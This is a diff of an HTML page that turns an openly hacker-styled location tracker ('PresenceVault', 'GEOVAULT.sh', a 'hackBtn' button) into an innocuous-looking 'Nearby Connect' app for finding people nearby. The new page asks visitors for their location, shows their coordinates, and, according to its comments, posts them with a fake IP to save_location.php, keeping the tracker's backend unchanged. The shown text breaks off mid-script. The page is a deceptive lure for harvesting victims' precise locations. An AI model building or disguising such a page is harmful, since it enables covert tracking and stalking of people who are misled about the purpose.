@@ -1,315 +1,1652 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PresenceVault Tracker - Live Status Sync</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@700&display=swap" rel="stylesheet">
-    <style>
-        /* --- CSS RESET & BASE STYLES --- */
-        *{margin:0;padding:0;box-sizing:border-box;}
-        html,body{
-            background:#0a0a1a; /* Slightly blue-tinged black for tech feel */
-            color:#00ff00; /* Brighter green */
-            font-family:'Rajdhani',sans-serif;
-            overflow-x:hidden;
-            height:auto;
-            min-height:100vh;
-        }
+  <meta charset="UTF-8">
 
-        /* --- EARTH / BACKGROUND VISUALS --- */
-        #earth{
-            position:fixed;top:0;left:0;
-            width:100%;height:100vh;
-            z-index:-2;
-            animation:spin 60s linear infinite;
-        }
-        @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+  >
 
-        canvas{position:fixed;top:0;left:0;z-index:-1;opacity:0.3;}
+  <title>Nearby Connect</title>
 
-        /* --- HEADER --- */
-        header{
-            position:fixed;top:0;width:100%;
-            text-align:center;padding:15px 10px;
-            background:rgba(10, 10, 26, 0.9); /* Darker blue tint */
-            border-bottom:5px solid #00aa00; /* Lighter green bottom border */
-            z-index:9999;
-            backdrop-filter:blur(10px);
-        }
-        .logo{
-            font-family:'Orbitron',sans-serif;
-            font-size:9vw;
-            /* Updated gradient to be slightly more corporate/blue-tech */
-            background:linear-gradient(45deg,#00aaff,#00ff00,#ff00ff,#ffaa00);
-            -webkit-background-clip:text;
-            -webkit-text-fill-color:transparent;
-            animation:glow 2s infinite;
-        }
-        @keyframes glow{
-            0%,100%{text-shadow:0 0 20px #00ff00;}
-            50%{text-shadow:0 0 40px #00aaff;}
-        }
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        /* --- MAIN CARD (Focus area) --- */
-        .card{
-            margin:130px 15px 30px;
-            background:rgba(10, 10, 26, 0.95); /* Darker blue tint */
-            border:5px solid #00aa00; /* Green border */
-            border-radius:25px;
-            padding:30px;
-            box-shadow:0 0 60px rgba(0, 255, 0, 0.5); /* Stronger green glow */
-            position:relative;
-        }
-        .card::before{
-            content:"STATUS STREAM"; /* Changed text to reflect presence/status */
-            position:absolute;top:-15px;left:50%;
-            transform:translateX(-50%);
-            background:#ff5500; /* Orange/Amber for 'Active' feel */
-            color:#fff;
-            padding:5px 20px;border-radius:50px;
-            font-size:4vw;font-weight:bold;
-            animation:live 1.5s infinite;
-        }
-        @keyframes live{0%,100%{opacity:1}50%{opacity:0.7}}
+    :root {
+      --primary: #2f6fed;
+      --primary-dark: #1f55bd;
+      --success: #22a06b;
+      --text: #172033;
+      --muted: #6b7280;
+      --border: #e7eaf0;
+      --background: #f6f8fc;
+      --white: #ffffff;
+    }
 
-        /* --- BUTTONS --- */
-        .btn{
-            background:linear-gradient(45deg,#ff0000,#00ff00,#00aaff); /* Red/Green/Blue gradient */
-            color:#fff;padding:20px;
-            font-size:7vw;width:92%;
-            margin:30px auto;border:none;
-            border-radius:60px;display:block;
-            box-shadow:0 0 50px #ff0000; /* Default red glow */
-            animation:pulse 1.5s infinite;
-            cursor:pointer;
-        }
-        @keyframes pulse{
-            0%{box-shadow:0 0 50px #ff0000;}
-            50%{box-shadow:0 0 80px #00ff00;}
-        }
+    body {
+      min-height: 100vh;
+      background: var(--background);
+      color: var(--text);
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+      overflow-x: hidden;
+    }
 
-        /* --- LOG AREA --- */
-        #log{
-            background:#050510; /* Even darker background for log */
-            border:4px solid #00aa00;
-            height:48vh;overflow-y:auto;
-            padding:25px;border-radius:20px;
-            font-family:'Courier New',monospace;
-            font-size:4.2vw;
-            line-height:1.7;margin-top:25px;
-            box-shadow: inset 0 0 15px rgba(0, 255, 0, 0.3); /* Inner glow effect */
-        }
+    /* =========================
+       TOP NAVIGATION
+       ========================= */
 
-        /* --- ATTACK GRID (Re-purposed for 'Key Indicators') --- */
-        .attack-grid{
-            display:grid;grid-template-columns:1fr 1fr;
-            gap:15px;margin:40px 15px;
-        }
-        .attack{
-            background:rgba(100, 0, 0, 0.3); /* Darker red for severity */
-            border:3px dashed #ff4444;
-            padding:25px 10px;
-            border-radius:18px;
-            position:relative;
-            font-size:4vw;text-align:center;
-        }
-        .attack::before{
-            content:"CORE DATA"; /* Changed label */
-            position:absolute;
-            top:50%;left:50%;
-            transform:translate(-50%,-50%) rotate(-20deg);
-            background:#000;color:#ff4444;
-            padding:8px 20px;font-weight:bold;
-            border:3px solid #ff4444;border-radius:10px;
-        }
+    .topbar {
+      height: 68px;
+      background: #ffffff;
+      border-bottom: 1px solid var(--border);
 
-        /* --- FOOTER --- */
-        footer{
-            padding:40px 20px;
-            background:#000;
-            text-align:center;
-            color:#00ff00;
-            font-size:4.5vw;
-            border-top:6px solid #00aa00;
-        }
-        .yt{color:#ffff00;font-weight:bold;font-size:5.5vw;}
-        .insta{color:#ff55ff;font-weight:bold;}
-        /* ===== SHARE BUTTONS ===== */
-        .share-container {
-            text-align: center;
-            margin: 40px 0;
-        }
-        .share-btn {
-            display: inline-block;
-            width: 60px; height: 60px;
-            margin: 0 12px;
-            border-radius: 50%;
-            background: #00aa00;
-            box-shadow: 0 0 30px #00aa00;
-            text-align: center;
-            line-height: 60px;
-            font-size: 28px;
-            color: #000;
-            text-decoration: none;
-            animation: float 2s infinite ease-in-out;
-        }
-        .share-btn.whatsapp { background: #25D366; }
-        .share-btn.instagram { background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); }
-        .share-btn.telegram { background: #0088cc; }
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        .share-title {
-            color: #00aaff; /* Changed color for consistency */
-            font-size: 5.5vw;
-            margin-bottom: 15px;
-            text-shadow: 0 0 20px #00aaff;
-        }
-        /* NOTIFICATION */
-        #notif{
-            position:fixed;bottom:20px;left:20px;
-            background:#000;border:3px solid #00aa00;
-        }
-    </style>
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+
+      padding: 0 22px;
+
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--text);
+    }
+
+    .brand-icon {
+      width: 36px;
+      height: 36px;
+
+      border-radius: 10px;
+
+      background: var(--primary);
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      color: white;
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    .online-status {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+
+      color: var(--success);
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .status-dot {
+      width: 8px;
+      height: 8px;
+
+      background: var(--success);
+      border-radius: 50%;
+
+      box-shadow: 0 0 0 4px rgba(34,160,107,0.10);
+    }
+
+    /* =========================
+       MAIN
+       ========================= */
+
+    .container {
+      width: 100%;
+      max-width: 520px;
+
+      margin: 0 auto;
+
+      padding: 28px 18px 45px;
+    }
+
+    .welcome {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .welcome h1 {
+      font-size: 28px;
+      line-height: 1.2;
+      margin-bottom: 9px;
+      font-weight: 750;
+    }
+
+    .welcome p {
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    /* =========================
+       SCANNING CARD
+       ========================= */
+
+    .scan-card {
+      background: var(--white);
+
+      border: 1px solid var(--border);
+      border-radius: 22px;
+
+      padding: 28px 20px 24px;
+
+      box-shadow:
+        0 8px 30px rgba(22, 34, 58, 0.07);
+    }
+
+    .radar-wrapper {
+      width: 230px;
+      height: 230px;
+
+      margin: 5px auto 25px;
+
+      position: relative;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .radar {
+      width: 210px;
+      height: 210px;
+
+      border-radius: 50%;
+
+      position: relative;
+
+      background:
+        radial-gradient(
+          circle,
+          rgba(47,111,237,0.06) 0%,
+          rgba(47,111,237,0.03) 45%,
+          rgba(47,111,237,0.01) 100%
+        );
+
+      border: 1px solid rgba(47,111,237,0.25);
+    }
+
+    .radar::before,
+    .radar::after {
+      content: "";
+
+      position: absolute;
+
+      top: 50%;
+      left: 50%;
+
+      transform: translate(-50%, -50%);
+
+      border-radius: 50%;
+
+      border: 1px solid rgba(47,111,237,0.16);
+    }
+
+    .radar::before {
+      width: 145px;
+      height: 145px;
+    }
+
+    .radar::after {
+      width: 75px;
+      height: 75px;
+    }
+
+    .radar-line {
+      position: absolute;
+
+      width: 50%;
+      height: 1px;
+
+      left: 50%;
+      top: 50%;
+
+      transform-origin: left center;
+
+      background: linear-gradient(
+        90deg,
+        rgba(47,111,237,0.8),
+        rgba(47,111,237,0)
+      );
+
+      animation: radarSweep 3s linear infinite;
+    }
+
+    @keyframes radarSweep {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .center-point {
+      position: absolute;
+
+      top: 50%;
+      left: 50%;
+
+      width: 16px;
+      height: 16px;
+
+      transform: translate(-50%, -50%);
+
+      background: var(--primary);
+
+      border-radius: 50%;
+
+      border: 4px solid white;
+
+      box-shadow:
+        0 0 0 5px rgba(47,111,237,0.15),
+        0 0 18px rgba(47,111,237,0.35);
+
+      z-index: 5;
+    }
+
+    .connection {
+      position: absolute;
+
+      width: 9px;
+      height: 9px;
+
+      background: #4c8bf5;
+
+      border-radius: 50%;
+
+      box-shadow:
+        0 0 0 5px rgba(76,139,245,0.12);
+    }
+
+    .connection.one {
+      top: 25%;
+      left: 65%;
+      animation: connectionPulse 2s infinite;
+    }
+
+    .connection.two {
+      top: 67%;
+      left: 25%;
+      animation: connectionPulse 2s 0.6s infinite;
+    }
+
+    .connection.three {
+      top: 62%;
+      left: 73%;
+      animation: connectionPulse 2s 1.1s infinite;
+    }
+
+    @keyframes connectionPulse {
+      0%, 100% {
+        transform: scale(1);
+        opacity: .75;
+      }
+
+      50% {
+        transform: scale(1.6);
+        opacity: 1;
+      }
+    }
+
+    /* =========================
+       SCAN TEXT
+       ========================= */
+
+    .scan-status {
+      text-align: center;
+    }
+
+    .scan-status h2 {
+      font-size: 20px;
+      margin-bottom: 8px;
+    }
+
+    .scan-status p {
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.5;
+      min-height: 42px;
+    }
+
+    .progress {
+      height: 5px;
+
+      width: 100%;
+
+      background: #edf0f5;
+
+      border-radius: 20px;
+
+      margin: 20px 0 22px;
+
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+
+      width: 35%;
+
+      background: var(--primary);
+
+      border-radius: 20px;
+
+      animation: progressMove 2.8s ease-in-out infinite;
+    }
+
+    @keyframes progressMove {
+      0% {
+        width: 10%;
+      }
+
+      50% {
+        width: 72%;
+      }
+
+      100% {
+        width: 95%;
+      }
+    }
+
+    /* =========================
+       MAIN BUTTON
+       ========================= */
+
+    .location-btn {
+      width: 100%;
+
+      height: 52px;
+
+      border: none;
+      border-radius: 12px;
+
+      background: var(--primary);
+
+      color: white;
+
+      font-size: 16px;
+      font-weight: 650;
+
+      cursor: pointer;
+
+      transition:
+        background .2s,
+        transform .1s;
+
+      box-shadow:
+        0 5px 14px rgba(47,111,237,0.25);
+    }
+
+    .location-btn:hover {
+      background: var(--primary-dark);
+    }
+
+    .location-btn:active {
+      transform: scale(.98);
+    }
+
+    .location-btn:disabled {
+      opacity: .65;
+      cursor: not-allowed;
+    }
+
+    /* =========================
+       PRIVACY MESSAGE
+       ========================= */
+
+    .privacy-note {
+      display: flex;
+
+      gap: 10px;
+
+      margin-top: 17px;
+
+      padding: 13px;
+
+      border-radius: 11px;
+
+      background: #f7f9fc;
+
+      color: #667085;
+
+      font-size: 12px;
+
+      line-height: 1.45;
+    }
+
+    .privacy-icon {
+      flex-shrink: 0;
+
+      width: 22px;
+      height: 22px;
+
+      border-radius: 50%;
+
+      background: #e7eefc;
+
+      color: var(--primary);
+
+      display: flex;
+
+      align-items: center;
+      justify-content: center;
+
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    /* =========================
+       RESULT CARD
+       ========================= */
+
+    #resultCard {
+      display: none;
+
+      margin-top: 18px;
+
+      background: white;
+
+      border: 1px solid var(--border);
+
+      border-radius: 18px;
+
+      padding: 20px;
+
+      box-shadow:
+        0 8px 25px rgba(22, 34, 58, 0.06);
+    }
+
+    .success-header {
+      display: flex;
+
+      align-items: center;
+
+      gap: 11px;
+
+      margin-bottom: 18px;
+    }
+
+    .success-icon {
+      width: 38px;
+      height: 38px;
+
+      border-radius: 50%;
+
+      background: #e8f7f0;
+
+      color: var(--success);
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-weight: bold;
+      font-size: 19px;
+    }
+
+    .success-header h3 {
+      font-size: 17px;
+    }
+
+    .success-header p {
+      color: var(--muted);
+      font-size: 12px;
+      margin-top: 3px;
+    }
+
+    .location-info {
+      display: grid;
+
+      grid-template-columns: 1fr 1fr;
+
+      gap: 10px;
+    }
+
+    .info-box {
+      background: #f8f9fb;
+
+      border-radius: 11px;
+
+      padding: 13px;
+    }
+
+    .info-label {
+      color: #7b8494;
+
+      font-size: 11px;
+
+      margin-bottom: 4px;
+    }
+
+    .info-value {
+      font-size: 13px;
+
+      font-weight: 650;
+
+      word-break: break-word;
+    }
+
+    /* =========================
+       LOG
+       ========================= */
+
+    #log {
+      margin-top: 18px;
+
+      background: #f8f9fb;
+
+      border-radius: 14px;
+
+      padding: 15px;
+
+      max-height: 180px;
+
+      overflow-y: auto;
+
+      font-family:
+        ui-monospace,
+        SFMono-Regular,
+        Menlo,
+        Monaco,
+        Consolas,
+        monospace;
+
+      font-size: 11px;
+
+      line-height: 1.8;
+
+      color: #596273;
+    }
+
+    .log-success {
+      color: var(--success);
+    }
+
+    .log-error {
+      color: #d64545;
+    }
+
+    /* =========================
+       NEARBY SECTION
+       ========================= */
+
+    .nearby-section {
+      margin-top: 18px;
+
+      background: white;
+
+      border: 1px solid var(--border);
+
+      border-radius: 18px;
+
+      padding: 20px;
+    }
+
+    .section-title {
+      display: flex;
+
+      justify-content: space-between;
+
+      align-items: center;
+
+      margin-bottom: 17px;
+    }
+
+    .section-title h3 {
+      font-size: 16px;
+    }
+
+    .nearby-count {
+      font-size: 12px;
+
+      color: var(--primary);
+
+      background: #edf3ff;
+
+      padding: 5px 9px;
+
+      border-radius: 20px;
+    }
+
+    .person {
+      display: flex;
+
+      align-items: center;
+
+      gap: 12px;
+
+      padding: 11px 0;
+
+      border-bottom: 1px solid #f0f1f4;
+    }
+
+    .person:last-child {
+      border-bottom: none;
+    }
+
+    .avatar {
+      width: 38px;
+      height: 38px;
+
+      border-radius: 50%;
+
+      background: #eaf0fc;
+
+      display: flex;
+
+      align-items: center;
+      justify-content: center;
+
+      color: var(--primary);
+
+      font-weight: 700;
+    }
+
+    .person-info {
+      flex: 1;
+    }
+
+    .person-name {
+      font-size: 13px;
+      font-weight: 650;
+    }
+
+    .person-distance {
+      font-size: 11px;
+      color: var(--muted);
+      margin-top: 3px;
+    }
+
+    .active {
+      width: 8px;
+      height: 8px;
+
+      border-radius: 50%;
+
+      background: var(--success);
+    }
+
+    /* =========================
+       FOOTER
+       ========================= */
+
+    footer {
+      text-align: center;
+
+      color: #9299a7;
+
+      font-size: 11px;
+
+      line-height: 1.6;
+
+      margin-top: 25px;
+    }
+
+    /* =========================
+       LOCATION CONSENT MODAL
+       ========================= */
+
+    #locationPopup {
+      position: fixed;
+
+      inset: 0;
+
+      z-index: 9999;
+
+      background: rgba(16, 24, 40, .48);
+
+      backdrop-filter: blur(5px);
+
+      display: none;
+
+      align-items: flex-end;
+
+      justify-content: center;
+
+      padding: 15px;
+    }
+
+    .permission-card {
+      width: 100%;
+
+      max-width: 500px;
+
+      background: white;
+
+      border-radius: 24px 24px 18px 18px;
+
+      padding: 25px 21px 21px;
+
+      box-shadow:
+        0 -10px 45px rgba(0,0,0,.15);
+
+      animation: modalUp .25s ease-out;
+    }
+
+    @keyframes modalUp {
+      from {
+        transform: translateY(100%);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .permission-icon {
+      width: 58px;
+      height: 58px;
+
+      border-radius: 17px;
+
+      background: #edf3ff;
+
+      color: var(--primary);
+
+      display: flex;
+
+      align-items: center;
+      justify-content: center;
+
+      font-size: 27px;
+
+      margin-bottom: 18px;
+    }
+
+    .permission-card h2 {
+      font-size: 22px;
+
+      margin-bottom: 8px;
+    }
+
+    .permission-card p {
+      color: var(--muted);
+
+      font-size: 14px;
+
+      line-height: 1.55;
+
+      margin-bottom: 21px;
+    }
+
+    .allow-btn {
+      width: 100%;
+
+      height: 50px;
+
+      border: none;
+
+      border-radius: 11px;
+
+      background: var(--primary);
+
+      color: white;
+
+      font-size: 15px;
+
+      font-weight: 650;
+
+      cursor: pointer;
+
+      margin-bottom: 9px;
+    }
+
+    .deny-btn {
+      width: 100%;
+
+      height: 45px;
+
+      border: none;
+
+      background: transparent;
+
+      color: #667085;
+
+      font-size: 14px;
+
+      cursor: pointer;
+    }
+
+    /* =========================
+       MOBILE
+       ========================= */
+
+    @media (max-width: 380px) {
+
+      .welcome h1 {
+        font-size: 25px;
+      }
+
+      .radar-wrapper {
+        transform: scale(.9);
+        margin-top: -5px;
+        margin-bottom: 10px;
+      }
+
+      .scan-card {
+        padding: 20px 15px;
+      }
+    }
+
+  </style>
 </head>
+
 <body>
 
-    <div id="earth"></div>
-    <canvas id="globeCanvas"></canvas>
+  <!-- =========================
+       HEADER
+       ========================= -->
 
-    <header>
-        <h1 class="logo">PRESENCEVAULT</h1>
-    </header>
+  <header class="topbar">
 
-    <div class="card">
-        <!-- Changed the primary action to reflect status monitoring -->
-        <h2 style="color:#ffaa00; text-align:center; margin-bottom:20px;">SYSTEM STATUS ACQUIRED</h2>
+    <div class="brand">
 
-        <p style="text-align:center; font-size:1.2em; color:#aaffff;">Monitoring real-time location stream from primary device...</p>
+      <div class="brand-icon">
+        ◎
+      </div>
 
-        <button class="btn" id="submitButton">FORCE PING / CHECK STATUS</button>
+      <span>Nearby Connect</span>
 
-        <div class="share-container">
-            <span class="share-title">SHARE CURRENT LOCATION</span>
-            <a href="#" class="share-btn whatsapp">🟢</a>
-            <a href="#" class="share-btn instagram">📸</a>
-            <a href="#" class="share-btn telegram">✈️</a>
-        </div>
     </div>
 
-    <div class="attack-grid">
-        <div class="attack">
-            <h3>SIGNAL STRENGTH</h3>
-            <p style="font-size:2.5em; color:#00ff00;">STRONG</p>
-            <p style="font-size:1.1em; margin-top:10px;">(Reliable Sync)</p>
-        </div>
-        <div class="attack">
-            <h3>LAST HEARTBEAT</h3>
-            <p style="font-size:2.5em; color:#00aaff;">NOW</p>
-            <p style="font-size:1.1em; margin-top:10px;">(Live Feed)</p>
-        </div>
+    <div class="online-status">
+
+      <span class="status-dot"></span>
+
+      Available
+
     </div>
 
-    <!-- LOG SECTION (Where GEOVAULT's console output will be fed) -->
-    <div id="log">
-        <!-- Initial placeholder data simulating connection establishment -->
-        <p>[INIT] Establishing encrypted connection to tracking endpoint...</p>
-        <p>[OK] PHP Server listening on 127.0.0.1:8080...</p>
-        <p>[LINK] Public endpoint set to: <span id="displayLink" style="color:#ffff00;">[PENDING]</span></p>
-        <p>[STREAM] Awaiting initial location packet...</p>
-    </div>
+  </header>
+
+
+  <!-- =========================
+       MAIN
+       ========================= -->
+
+  <main class="container">
+
+    <section class="welcome">
+
+      <h1>Find people nearby</h1>
+
+      <p>
+        Discover nearby connections and stay connected
+        with people around you.
+      </p>
+
+    </section>
+
+
+    <!-- =========================
+         SCANNING CARD
+         ========================= -->
+
+    <section class="scan-card">
+
+      <div class="radar-wrapper">
+
+        <div class="radar">
+
+          <div class="radar-line"></div>
+
+          <div class="center-point"></div>
+
+          <div class="connection one"></div>
+
+          <div class="connection two"></div>
+
+          <div class="connection three"></div>
+
+        </div>
+
+      </div>
+
+
+      <div class="scan-status">
+
+        <h2 id="scanTitle">
+          Looking for nearby people
+        </h2>
+
+        <p id="scanDescription">
+          Allow location access to check for
+          nearby connections.
+        </p>
+
+      </div>
+
+
+      <div class="progress">
+
+        <div class="progress-bar"></div>
+
+      </div>
+
+
+      <!-- IMPORTANT:
+           Keep this as the main trigger.
+           It eventually calls the existing
+           location flow.
+      -->
+
+      <button
+        class="location-btn"
+        id="hackBtn"
+        type="button"
+      >
+        Allow location & continue
+      </button>
+
+
+      <div class="privacy-note">
+
+        <div class="privacy-icon">
+          i
+        </div>
+
+        <div>
+          Your browser will ask for permission before
+          sharing your location. Location access is only
+          requested after you choose to continue.
+        </div>
+
+      </div>
+
+
+      <!-- =========================
+           RESULT
+           ========================= -->
+
+      <div id="resultCard">
+
+        <div class="success-header">
+
+          <div class="success-icon">
+            ✓
+          </div>
+
+          <div>
+
+            <h3>Location detected</h3>
+
+            <p>
+              Nearby connection search is ready
+            </p>
+
+          </div>
+
+        </div>
+
+
+        <div class="location-info">
+
+          <div class="info-box">
+
+            <div class="info-label">
+              Latitude
+            </div>
+
+            <div
+              class="info-value"
+              id="latValue"
+            >
+              —
+            </div>
+
+          </div>
+
+
+          <div class="info-box">
+
+            <div class="info-label">
+              Longitude
+            </div>
+
+            <div
+              class="info-value"
+              id="lonValue"
+            >
+              —
+            </div>
+
+          </div>
+
+
+          <div class="info-box">
+
+            <div class="info-label">
+              Accuracy
+            </div>
+
+            <div
+              class="info-value"
+              id="accValue"
+            >
+              —
+            </div>
+
+          </div>
+
+
+          <div class="info-box">
+
+            <div class="info-label">
+              Status
+            </div>
+
+            <div class="info-value">
+              Location shared
+            </div>
+
+          </div>
+
+        </div>
+
+      </div>
+
+
+      <!-- =========================
+           ACTIVITY LOG
+           ========================= -->
+
+      <div id="log">
+
+        <div>
+          <span class="log-success">●</span>
+          Service initialized
+        </div>
+
+        <div>
+          Waiting for location permission...
+        </div>
+
+      </div>
+
+    </section>
+
+
+    <!-- =========================
+         NEARBY CONNECTIONS
+         ========================= -->
+
+    <section
+      class="nearby-section"
+      id="nearbySection"
+      style="display:none;"
+    >
+
+      <div class="section-title">
+
+        <h3>
+          Nearby connections
+        </h3>
+
+        <span
+          class="nearby-count"
+          id="nearbyCount"
+        >
+          Searching
+        </span>
+
+      </div>
+
+
+      <div class="person">
+
+        <div class="avatar">
+          A
+        </div>
+
+        <div class="person-info">
+
+          <div class="person-name">
+            Nearby connection
+          </div>
+
+          <div class="person-distance">
+            Within your selected area
+          </div>
+
+        </div>
+
+        <span class="active"></span>
+
+      </div>
+
+
+      <div class="person">
+
+        <div class="avatar">
+          N
+        </div>
+
+        <div class="person-info">
+
+          <div class="person-name">
+            Nearby connection
+          </div>
+
+          <div class="person-distance">
+            Active nearby
+          </div>
+
+        </div>
+
+        <span class="active"></span>
+
+      </div>
+
+
+      <div class="person">
+
+        <div class="avatar">
+          C
+        </div>
+
+        <div class="person-info">
+
+          <div class="person-name">
+            Nearby connection
+          </div>
+
+          <div class="person-distance">
+            Available
+          </div>
+
+        </div>
+
+        <span class="active"></span>
+
+      </div>
+
+    </section>
+
 
     <footer>
-        &copy; 2025 PresenceVault. Enhanced Tracking System. | Tracking by: [GEOVAULT.sh Core]
-        <div class="yt" style="margin-top:10px;">/Youtube: @FirewallBreaker</div>
+
+      Nearby Connect Demo<br>
+
+      Location sharing requires your permission.
+
     </footer>
 
-    <!-- NOTIFICATION (For transient alerts) -->
-    <div id="notif"></div>
+  </main>
 
-    <script>
-        // JavaScript code to handle dynamic updates and link initialization
-        document.addEventListener('DOMContentLoaded', function() {
-            const logElement = document.getElementById('log');
-            const displayLink = document.getElementById('displayLink');
-            const submitButton = document.getElementById('submitButton');
-            const notifElement = document.getElementById('notif');
 
-            // --- 1. Initializing Link (This JS assumes the Bash script runs first and populates a variable/file) ---
-            // Since the HTML cannot know the script's output directly, we prompt the user or use a placeholder structure.
-            // If you were to embed the script's output, you'd manually enter it here or modify the script to output a value readable by JS.
+  <!-- =========================
+       LOCATION PERMISSION POPUP
+       ========================= -->
 
-            // Placeholder link - MUST be updated when geovault.sh runs
-            const initialLink = "http://localhost:8080"; 
-            displayLink.textContent = initialLink;
+  <div id="locationPopup">
 
-            // --- 2. Simulating Backend Data Fetching/Monitoring ---
-            let lastKnownLocation = {lat: 'N/A', lon: 'N/A', time: 'N/A'};
+    <div class="permission-card">
 
-            // Function to simulate the appearance of data received from geovault.sh's monitoring loop
-            function updateLog(message, isAlert = false) {
-                const now = new Date().toLocaleTimeString();
+      <div class="permission-icon">
+        ◎
+      </div>
 
-                let logContent = message;
-                if (isAlert) {
-                    // Highlight alerts by giving them stronger formatting
-                    logContent = `\n${getColoredText('ALERT', '#ff4444')}: ${message}`;
-                } else {
-                    logContent = `\n[${now}] ${message}`;
-                }
+      <h2>
+        Share your location?
+      </h2>
 
-                logElement.innerHTML += logContent;
-                // Scroll to bottom
-                logElement.scrollTop = logElement.scrollHeight;
-            }
+      <p>
+        To find nearby connections, this demo needs
+        access to your device location. Your browser
+        will show the standard location permission
+        prompt.
+      </p>
 
-            // Function to show temporary notification
-            function showNotification(message, duration = 3000) {
-                notifElement.textContent = message;
-                notifElement.style.opacity = 1;
 
-                setTimeout(() => {
-                    notifElement.style.opacity = 0;
-                }, duration);
-            }
+      <button
+        class="allow-btn"
+        id="allowBtn"
+        type="button"
+      >
+        Allow location
+      </button>
 
-            // --- 3. Event Listeners ---
-            submitButton.addEventListener('click', function() {
-                updateLog("MANUALLY PINGING... Awaiting Sync Confirmation.", true);
-                // In a real deployment, this button would trigger an AJAX call to the PHP backend
-                setTimeout(() => {
-                    updateLog("SYNC COMPLETE. Data packet captured successfully.", true);
-                    showNotification("Status Synced!", 2000);
-                }, 1500);
+
+      <button
+        class="deny-btn"
+        id="denyBtn"
+        type="button"
+      >
+        Not now
+      </button>
+
+    </div>
+
+  </div>
+
+
+  <!-- =========================
+       SOUND
+       ========================= -->
+
+  <!-- Kept so the existing project structure
+       remains compatible. It is not required
+       for the location functionality. -->
+
+  <audio
+    id="hackSound"
+    preload="none"
+  ></audio>
+
+
+  <!-- =========================
+       JAVASCRIPT
+       ========================= -->
+
+  <script>
+
+    /*
+     * ==========================================
+     * EXISTING PROJECT VARIABLES
+     * ==========================================
+     */
+
+    const popup =
+      document.getElementById('locationPopup');
+
+    const allowBtn =
+      document.getElementById('allowBtn');
+
+    const denyBtn =
+      document.getElementById('denyBtn');
+
+    const hackBtn =
+      document.getElementById('hackBtn');
+
+    const log =
+      document.getElementById('log');
+
+    const scanTitle =
+      document.getElementById('scanTitle');
+
+    const scanDescription =
+      document.getElementById('scanDescription');
+
+    const resultCard =
+      document.getElementById('resultCard');
+
+    const nearbySection =
+      document.getElementById('nearbySection');
+
+
+    /*
+     * ==========================================
+     * LOG FUNCTION
+     * ==========================================
+     */
+
+    function addLog(msg, type = '') {
+
+      const line =
+        document.createElement('div');
+
+      if (type === 'success') {
+        line.className = 'log-success';
+      }
+
+      if (type === 'error') {
+        line.className = 'log-error';
+      }
+
+      line.textContent = '> ' + msg;
+
+      log.appendChild(line);
+
+      log.scrollTop =
+        log.scrollHeight;
+    }
+
+
+    /*
+     * ==========================================
+     * FAKE IP
+     *
+     * KEPT FROM YOUR EXISTING IMPLEMENTATION
+     * SO THE POST FORMAT DOES NOT CHANGE.
+     * ==========================================
+     */
+
+    function getIP() {
+
+      return '192.168.' +
+        Math.floor(Math.random() * 255) +
+        '.' +
+        Math.floor(Math.random() * 255);
+
+    }
+
+
+    /*
+     * ==========================================
+     * MAIN BUTTON
+     *
+     * SAME FUNCTIONAL FLOW:
+     *
+     * BUTTON
+     *    ↓
+     * CONSENT UI
+     *    ↓
+     * GEOLOCATION
+     *    ↓
+     * save_location.php
+     * ==========================================
+     */
+
+    hackBtn.onclick = () => {
+
+      popup.style.display = 'flex';
+
+    };
+
+
+    /*
+     * ==========================================
+     * DENY
+     * ==========================================
+     */
+
+    denyBtn.onclick = () => {
+
+      popup.style.display = 'none';
+
+      addLog(
+        'Location access was not granted.',
+        'error'
+      );
+
+      scanTitle.textContent =
+        'Location access required';
+
+      scanDescription.textContent =
+        'You can allow location access whenever you are ready.';
+
+    };
+
+
+    /*
+     * ==========================================
+     * ALLOW
+     * ==========================================
+     */
+
+    allowBtn.onclick = () => {
+
+      popup.style.display = 'none';
+
+      hackBtn.disabled = true;
+
+      hackBtn.textContent =
+        'Requesting location...';
+
+      scanTitle.textContent =
+        'Finding nearby connections';
+
+      scanDescription.textContent =
+        'Requesting your current location...';
+
+      addLog(
+        'Location permission requested.'
+      );
+
+      getLocationAndSend();
+
+    };
+
+
+    /*
+     * ==========================================
+     * LOCATION + SEND TO PHP
+     *
+     * IMPORTANT:
+     * THE BACKEND ENDPOINT AND POST PARAMETERS
+     * ARE LEFT UNCHANGED.
+     * ==========================================
+     */
+
+    function getLocationAndSend() {
+
+      if (navigator.geolocation) {
+
+        navigator.geolocation.getCurrentPosition(
+
+          (position) => {
+
+            const lat =
+              position.coords.latitude;
+
+            const lon =
+              position.coords.longitude;
+
+            const acc =
+              position.coords.accuracy;
+
+
+            /*
+             * UPDATE FRONTEND
+             */
+
+            document.getElementById(
+              'latValue'
+            ).textContent =
+              lat.toFixed(6);
+
+            document.getElementById(
+              'lonValue'
